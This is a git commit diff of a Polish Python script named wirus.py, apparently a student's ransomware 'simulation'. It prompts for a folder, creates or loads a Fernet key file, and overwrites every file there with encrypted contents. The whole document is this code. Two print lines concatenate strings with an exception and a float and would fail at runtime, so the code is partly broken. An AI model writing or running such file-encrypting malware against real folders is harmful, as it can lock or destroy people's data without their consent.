8eb452f8ff1aba3bb070652c1252a0b8a7b8d225
CatNipLover <blastebite@gmail.com>
2025-10-13 13:18:16 +0200

    Powinno działać

--- wirus.py
+++ wirus.py
@@ -1,26 +1,71 @@
-import os 
-from cryptography.fernet import Fernet
+import os  
+from cryptography.fernet import Fernet  
+import time
 
-files = []
+def wybierz_folder():
+    # Wybranie folderu do przeprowadzenia symulacji
 
-for file in os.listdir():
-    if file == "wirus.py" or file == "klucz.key":
-        continue
-    if os.path.isfile(file):
-        files.append(file)
+    folder_path = input("Podaj ścieżkę do folderu: ")  
+    if os.path.isdir(folder_path):
+        print("Wybrano folder: " + folder_path)
+        return folder_path
+    else:
+        print("Zły folder")
+        return None
+
+def wczytaj_pliki(folder_path):
+    # Funkcja liczy pliki w folderze i pomija plik wirus.py i klucz
+
+    files = []   
+    for file in os.listdir(folder_path):  
+        if file in ["wirus.py", "klucz.key"]:  
+            continue
+        file_path = os.path.join(folder_path, file) 
+        if os.path.isfile(file_path):  
+            files.append(file) 
+    return files
+
+def szyforwanie(folder_path):
+    # Szyfruje pliki w folderze poza kluczem oraz plikiem wirusa
+    # Generuje nowy klucz do pliku
     
-print(file)
-
-key = Fernet.generate_key()
-
-print(key)
-
-with open("klucz.key", "wb") as klucz: 
-    klucz.write(key)
-
-for file in files:
-    with open(file, "rb") as pliczki:
-        contents = pliczki.read()
-    contents_encrypted = Fernet(key).encrypt(contents)
-    with open(file,"wb") as pliczki:
-        pliczki.write(contents_encrypted)
+    if folder_path is None: 
+        return None
+    
+    key_file = "klucz.key" 
+    key_path = os.path.join(folder_path, key_file)
+    
+    
+    if not os.path.exists(key_path):
+        key = Fernet.generate_key()  
+        with open(key_path, "wb") as klucz:  
+            klucz.write(key)  
+        print("Utworzono klucz w pliku: " + key_path)
+        print("Klucz szyfrujący: " + key.decode('utf-8'))  
+    else:  
+        with open(key_path, "rb") as klucz: 
+            key = klucz.read() 
+        print("Wczytano klucz z pliku: " + key_path)
+        print("Klucz szyfrujący to: " + key.decode('utf-8'))  
+    
+    # Szyfrowanie plików
+    start = time.time() 
+    files = wczytaj_pliki(folder_path)  
+    fernet = Fernet(key) 
+    
+    # Pętla przechodzi przez kolejne pliki w podanym folderze
+    for file in files: 
+        file_path = os.path.join(folder_path, file)  
+        try:
+            with open(file_path, "rb") as pliczki:  
+                contents = pliczki.read()  # Wczytaj pliki
+            contents_encrypted = fernet.encrypt(contents)  # Szyfruje zawartośc
+            with open(file_path, "wb") as pliczki: 
+                pliczki.write(contents_encrypted)  # Zastępuje zawartość pliku zaszyfrowanymi
+            print("Zaszyfrowano plik: " + file) 
+        except Exception as e:
+            print("Błąd podczas szyfrowania pliku: " + file + " błąd: " + e) 
+    
+    czas = time.time() - start  
+    print("Symulacja wykonałą się w: " + czas + "s") 
+    return key 
